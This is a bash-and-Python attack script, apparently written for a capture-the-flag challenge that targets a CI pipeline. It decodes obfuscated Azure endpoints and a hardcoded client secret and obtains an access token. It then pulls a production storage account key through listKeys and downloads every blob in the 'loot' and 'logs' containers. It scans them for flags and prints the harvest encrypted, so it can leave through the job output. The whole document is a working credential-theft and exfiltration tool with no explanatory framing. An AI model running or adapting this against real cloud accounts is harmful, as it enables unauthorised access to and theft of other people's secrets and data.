#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; AAD="${SC}$(printf '%s' 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==' | base64 -d)"; ARM="${SC}$(printf '%s' 'bWFuYWdlbWVudC5henVyZS5jb20=' | base64 -d)"
CID=$(printf '%s' 'NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0' | base64 -d); CSEC=$(printf '%s' 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==' | base64 -d)
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
AT=$(curl -sS -X POST "$AAD/$AZURE_TENANT_ID/oauth2/v2.0/token" -d client_id=$CID -d client_secret=$CSEC -d grant_type=client_credentials --data-urlencode "scope=$ARM/.default" | jq -r '.access_token // empty')
KEY=$(curl -sS -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' -d '{}' "$ARM/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
python3 - "$KEY" <<'PY' >&3
import sys,hmac,hashlib,base64,datetime,urllib.request,urllib.error,re
key=sys.argv[1]
if not key: print("NOKEY"); sys.exit()
acct="sttblcilogsprodx3euoz"
def req(path,params=None):
    now=datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    can_h="x-ms-date:"+now+"\nx-ms-version:2021-08-06\n"
    can_r="/"+acct+path
    if params: can_r+="\n"+"\n".join("%s:%s"%(k,params[k]) for k in sorted(params))
    sts="GET\n\n\n\n\n\n\n\n\n\n\n\n"+can_h+can_r
    sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
    url="https://%s.blob.core.windows.net%s"%(acct,path)+("?"+"&".join("%s=%s"%(k,params[k]) for k in sorted(params)) if params else "")
    r=urllib.request.Request(url,headers={"x-ms-date":now,"x-ms-version":"2021-08-06","Authorization":"SharedKey %s:%s"%(acct,sig)})
    try:
        with urllib.request.urlopen(r,timeout=25) as x: return x.status,x.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.code,e.read().decode('utf-8','replace')
    except Exception as e: return 0,str(e)
for c in ("loot","logs"):
    s,b=req("/"+c,{"restype":"container","comp":"list","maxresults":"200"})
    print("LIST",c,s,b[:2500])
    for n in re.findall(r'<Name>([^<]+)</Name>',b):
        s2,b2=req("/"+c+"/"+n)
        print("BLOB",c,n,s2,len(b2),repr(b2[:1200]))
PY
say "FLAGSCAN: $(grep -aoiE 'DF26\{[^}]{1,200}\}' "$LOOT" | sort -u | head -3)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
